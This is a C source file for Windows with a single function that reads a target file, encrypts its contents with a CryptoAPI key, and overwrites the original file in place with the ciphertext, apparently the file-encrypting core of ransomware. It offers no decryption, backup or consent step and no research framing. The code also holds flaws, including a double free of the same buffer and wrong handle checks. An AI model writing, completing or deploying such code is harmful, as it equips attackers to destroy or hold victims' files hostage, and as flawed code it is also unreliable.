#include <stdio.h>
#include <Windows.h>
#include "keyDef.h"

int encryptor(char* filePath, key keyStruct) {

	// Opening file to be encrypted
	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) {
		printf("\n(!) Failed to open file, Error: %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully opened file");
	}

	// Getting size of target file
	LARGE_INTEGER fileSize;
	if (!GetFileSizeEx(hFile, &fileSize)) {
		("\n(!) Failed to get size of file, Error: %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully got size of file %i", fileSize.QuadPart);
	}

	// Allocating buffer for file data
	char* fileData = (char*)malloc(3 * fileSize.QuadPart);
	DWORD readSize = 0;

	// Reading file data into buffer
	if (!ReadFile(hFile, fileData, fileSize.QuadPart, &readSize, NULL)) {
		printf("\n(!) Error reading file - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully read file %i", readSize);
	}

	// Reallocating buffer to be larger for encryption
	char* newFileData = (char*)realloc(fileData, 3 * readSize);
	fileData = newFileData;

	// Encrypting file data with symmetric key
	DWORD encryptedSize = readSize;
	if (!CryptEncrypt(keyStruct.hKey, 0, TRUE, 0, (BYTE*)fileData, &encryptedSize, (2 * readSize) + 16)) {
		printf("\n(!) Error encrypting data - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully encrypted data %i", encryptedSize);
	}

	// Closing file handle
	if (!CloseHandle(hFile)) {
		printf("\n(!) Error closing file handle - %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully closed file handle");
	}

	// Creating new file to store encrypted data
	HANDLE hNewFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNewFile == NULL) {
		printf("\n(!) Failed to create new file, Error: %lu", GetLastError());
	} else {
		printf("\n(+) Succesfully created new file");
	}

	// Writing encrypted data to new file
	DWORD writtenBytes = NULL;
	if (hNewFile != NULL) {
		if (!WriteFile(hNewFile, fileData, encryptedSize, &writtenBytes, NULL)) {
			printf("\n(!) Error putting content in new file - %lu", GetLastError());
		} else {
			printf("\n(+) Succesfully put content in new file");
		}
	} else {
		printf("\n(!) Error putting content in new file - %lu", GetLastError());
	}
	free(fileData);
	free(newFileData);

	// Closing new file handle
	if (!CloseHandle(hNewFile)) {
		printf("\n(!) Error closing new file handle - %lu\n", GetLastError());
	} else {
		printf("\n(+) Succesfully closed new file handle\n");
	}

	return 0;
}

